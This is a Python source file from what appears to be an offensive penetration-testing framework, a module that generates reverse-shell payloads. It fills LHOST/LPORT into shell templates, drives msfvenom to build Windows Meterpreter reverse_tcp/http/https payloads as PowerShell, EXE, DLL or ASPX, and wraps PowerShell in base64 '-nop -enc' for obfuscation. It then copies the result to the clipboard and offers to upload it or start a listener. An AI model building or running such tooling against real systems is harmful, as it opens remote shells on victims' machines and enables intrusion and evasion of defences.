from pathlib import Path
import subprocess
from urllib.parse import quote_plus
import base64

from core.attacker import resolve_lhost

# --- CLEAN UI PALETTE ---
G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
W_BOLD, DIM = '\033[1m', '\033[2m'

BASE_DIR = Path(__file__).resolve().parent.parent.parent
SHELL_DIR = BASE_DIR / "shells"

# =========================================================
# HELPERS
# =========================================================

def detect_mode(path):
    ext = path.suffix.lower()
    if ext in [".php", ".ps1", ".exe", ".dll", ".bat"]:
        return "file"
    return "inline"


def discover_shells():
    shells = {}

    if not SHELL_DIR.exists():
        return shells

    for path in SHELL_DIR.rglob("*"):
        if not path.is_file():
            continue

        rel = path.relative_to(SHELL_DIR)

        shells[str(rel.with_suffix(""))] = {
            "path": path,
            "mode": detect_mode(path),
        }

    return shells


def copy_to_clipboard(text):
    for utility in (
        ["xclip", "-selection", "clipboard"],
        ["xsel", "-bi"],
    ):
        try:
            p = subprocess.Popen(
                utility,
                stdin=subprocess.PIPE,
                close_fds=True,
            )
            p.communicate(input=text.encode("utf-8"))
            return True
        except FileNotFoundError:
            pass

    try:
        p = subprocess.Popen(
            ["pbcopy"],
            stdin=subprocess.PIPE,
            close_fds=True,
        )
        p.communicate(input=text.encode("utf-8"))
        return True
    except Exception:
        return False


import shutil


def generate_meterpreter(
    stype,
    lhost,
    lport,
    data,
):
    payloads = {

        "windows/x86/meterpreter/reverse_tcp":
            "windows/meterpreter/reverse_tcp",

        "windows/meterpreter/reverse_tcp":
            "windows/x64/meterpreter/reverse_tcp",

        "windows/meterpreter/reverse_http":
            "windows/x64/meterpreter/reverse_http",

        "windows/meterpreter/reverse_https":
            "windows/x64/meterpreter/reverse_https",
    }

    if stype not in payloads:

        print(
            f"\n{R}[!] Unknown Meterpreter payload.{W}\n"
        )

        return None

    print(
        f"\n{W_BOLD}[*] OUTPUT FORMAT{W}\n"
    )

    print(
        f"  {B}[1]{W} PowerShell"
    )

    print(
        f"  {B}[2]{W} EXE"
    )

    print(
        f"  {B}[3]{W} DLL"
    )

    print(
        f"  {B}[4]{W} ASPX\n"
    )

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    formats = {
        "1": ("psh-cmd", ".txt"),
        "2": ("exe", ".exe"),
        "3": ("dll", ".dll"),
        "4": ("aspx", ".aspx"),
    }

    if choice not in formats:
        return None

    fmt, ext = formats[choice]

    outfile = (
        Path.cwd()
        / f"meterpreter_{lport}{ext}"
    )

    cmd = [
        "msfvenom",
        "-p",
        payloads[stype],
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f",
        fmt,
    ]

    #
    # psh-cmd prints to stdout.
    #

    if fmt == "psh-cmd":

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:

            print(result.stderr)

            return None

        payload = result.stdout.strip()

        outfile.write_text(payload)

    else:

        cmd.extend([
            "-o",
            str(outfile),
        ])

        result = subprocess.run(cmd)

        if result.returncode != 0:
            return None

        payload = str(outfile)

    print()

    print(
        f"{G}[+] Meterpreter payload generated{W}"
    )

    print(
        f"{B}  ├── Payload:{W} "
        f"{payloads[stype]}"
    )

    print(
        f"{B}  ├── Format:{W} "
        f"{fmt}"
    )

    print(
        f"{B}  └── File:{W} "
        f"{outfile}\n"
    )

    from core.runner import run_module_by_name

    print(
        f"{B}Next\n"
    )

    print(
        f"  {B}[1]{W} Upload payload"
    )

    print(
        f"  {B}[2]{W} Start handler"
    )

    print(
        f"  {B}[3]{W} Done\n"
    )

    choice = input(
        f"{Y}Select> {W}"
    ).strip()

    if choice == "1":

        from modules.upload.windows import stage_windows_files

        stage_windows_files(
            [outfile],
            data=data,
        ) 

    elif choice == "2":

        run_module_by_name(
            "shell.handler",
            [
                payloads[stype],
                lhost,
                str(lport),
            ],
            data,
        )    





    if fmt == "psh-cmd":

        print(payload)

        print()

        copy_to_clipboard(payload)

    return {
        "payload": payload,
        "file": str(outfile),
    }

# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):
    shells = discover_shells()

    stype = (
        args.extra[0]
        if (hasattr(args, "extra") and args.extra)
        else "bash/reverse"
    )

    if stype not in shells:
        print(f"\n{R}[!] Error: Unknown shell template type '{stype}'{W}")

        print(f"\n{W_BOLD}[*] Available Templates:{W}")
        for name in sorted(shells):
            print(f"  {B}├──{W} {name}")

        print()
        return

    shell_info = shells[stype]

    # -----------------------------------------------------
    # LHOST / LPORT
    # -----------------------------------------------------

    proxy = data.get("proxy")

    if proxy:
        default_lhost = proxy
    else:
        default_lhost = resolve_lhost(args)

    if not default_lhost:

        print(
            f"\n{R}[!] Error: LHOST resolution failed.{W}\n"
        )

        return

    lhost = input(
        f"{Y}LHOST [{C}{default_lhost}{Y}]> {W}"
    ).strip()

    if not lhost:

        lhost = default_lhost

    default_lport = 4444

    lport = input(
        f"{Y}LPORT [{C}{default_lport}{Y}]> {W}"
    ).strip()

    if not lport:

        lport = default_lport

    lport = int(lport)
    #
    # Meterpreter payloads
    #

    if "/meterpreter/" in stype:
        result = generate_meterpreter(
            stype,
            lhost,
            lport,
            data
        )

        if not result:
            return

        return [{
            "type": "shell",
            "data": result,
        }]

    shell_path = shell_info["path"]

    if not shell_path.exists():

        print(
            f"\n{R}[!] Error: Template file missing: "
            f"{shell_path}{W}\n"
        )

        return    
 

    # -----------------------------------------------------
    # BUILD PAYLOAD
    # -----------------------------------------------------

    payload = (
        shell_path.read_text().strip()
        .replace("{lhost}", lhost)
        .replace("{lport}", str(lport))
    )

    url_encoded = getattr(args, "url", False)
    base64_encoded = getattr(args, "base64", False)

    #
    # PowerShell payloads
    #

    if stype.startswith("windows/powershell"):

        #
        # Strip "powershell ... -c" if the template contains it.
        #

        lower = payload.lower()

        if lower.startswith("powershell"):

            idx = lower.find("-c ")

            if idx != -1:

                script = payload[idx + 3:].strip()

                if (
                    script.startswith('"')
                    and script.endswith('"')
                ):
                    script = script[1:-1]

            else:

                script = payload

        else:

            script = payload

        if base64_encoded:

            payload = (
                "powershell -nop -enc "
                + base64.b64encode(
                    script.encode("utf-16le")
                ).decode()
            )

        else:

            payload = (
                f'powershell -nop -c "{script}"'
            )

    #
    # Other payloads
    #

    elif base64_encoded:

        payload = base64.b64encode(
            payload.encode()
        ).decode()

    #
    # URL Encode
    #

    if url_encoded:

        payload = quote_plus(payload)

    # -----------------------------------------------------
    # OUTPUT FILE
    # -----------------------------------------------------

    ext = shell_path.suffix if shell_path.suffix else ".txt"

    suffix = ""

    if base64_encoded:
        suffix += "_b64"

    if url_encoded:
        suffix += "_url"

    outfile = (
        Path.cwd()
        / f"{stype.replace('/', '_')}_{lport}{suffix}{ext}"
    )

    outfile.write_text(payload)

    raw_mode = (getattr(args, "format", None) == "raw")

    if not raw_mode:
        print(f"\n{W_BOLD}[*] SHELL GENERATION SUMMARY{W}")
        print(f"  {B}├──{W} Template:   {C}{stype}{W}")
        print(f"  {B}├──{W} Listener:   {G}{lhost}{W}:{Y}{lport}{W}")
        print(f"  {B}├──{W} Execution:  {Y}{shell_info['mode']}{W}")
        print(f"  {B}├──{W} Base64:     {G}{'Yes' if base64_encoded else 'No'}{W}")
        print(f"  {B}├──{W} URL Encode:{G}{'Yes' if url_encoded else 'No'}{W}")
        print(f"  {B}└──{W} Artifact:  {G}{outfile}{W}")

        if shell_info["mode"] == "inline":
            print(f"\n{W_BOLD}[*] Generated Payload String:{W}\n")
            print(f"      {Y}{payload.strip()}{W}\n")

            if copy_to_clipboard(payload):
                print(
                    f"  {G}[+] Payload copied directly "
                    f"to system clipboard.{W}\n"
                )
        else:
            print(
                f"\n{W_BOLD}[*] Script file compiled "
                f"and ready.{W}\n"
            )
    else:
        print(payload)

    return [
        {
            "type": "shell",
            "data": {
                "payload": payload,
                "file": str(outfile),
                "url_encoded": url_encoded,
                "base64_encoded": base64_encoded,
            }
        }
    ]